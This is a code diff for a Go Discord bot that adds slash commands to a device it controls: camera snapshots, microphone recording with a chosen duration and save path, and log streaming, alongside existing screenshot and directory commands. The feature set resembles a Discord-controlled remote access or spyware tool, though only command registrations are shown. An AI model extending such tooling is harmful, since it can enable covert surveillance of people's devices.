@@ -40,6 +40,8 @@ func main() {
 		return
 	}
 
+	log.SetOutput(&discordLogWriter{base: os.Stdout})
+
 	commands := []*discordgo.ApplicationCommand{
 		{
 			Name:        "help",
@@ -60,6 +62,50 @@ func main() {
 		{
 			Name:        "screenshot",
 			Description: "Capture screenshots of all displays on this device",
+		},
+		{
+			Name:        "camera",
+			Description: "Capture a snapshot from the default camera",
+		},
+		{
+			Name:        "mic",
+			Description: "Record from the microphone on this device",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionInteger,
+					Name:        "duration",
+					Description: "Duration in seconds (1-300)",
+					Required:    false,
+				},
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "path",
+					Description: "Destination file path on this device",
+					Required:    false,
+				},
+			},
+		},
+		{
+			Name:        "log",
+			Description: "Stream or stop Go logs into this device channel",
+			Options: []*discordgo.ApplicationCommandOption{
+				{
+					Type:        discordgo.ApplicationCommandOptionString,
+					Name:        "mode",
+					Description: "on or off",
+					Required:    true,
+					Choices: []*discordgo.ApplicationCommandOptionChoice{
+						{
+							Name:  "on",
+							Value: "on",
+						},
+						{
+							Name:  "off",
+							Value: "off",
+						},
+					},
+				},
+			},
 		},
 		{
 			Name:        "cwd",
